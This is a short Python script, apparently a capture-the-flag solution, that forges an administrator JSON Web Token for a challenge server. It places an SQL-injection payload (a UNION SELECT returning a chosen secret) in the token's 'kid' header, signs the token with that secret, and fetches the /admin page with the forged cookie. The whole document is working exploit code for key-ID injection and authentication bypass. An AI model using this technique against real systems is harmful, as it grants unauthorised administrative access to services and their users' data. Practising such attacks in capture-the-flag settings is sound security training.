import jwt
import requests

url = "http://chal1.lagncra.sh:8436"
session = requests.Session()
session.get(url)

secret = "techie_ernie_loves_kids"
payload = f'" AND 1=0 UNION SELECT "{secret}" -- '

admin_jwt = jwt.encode(
    {"role": "admin"},
    secret,
    algorithm="HS256",
    headers={"kid": payload}
)

res = session.get(f"{url}/admin", cookies={"jwt": admin_jwt})
print(res.text)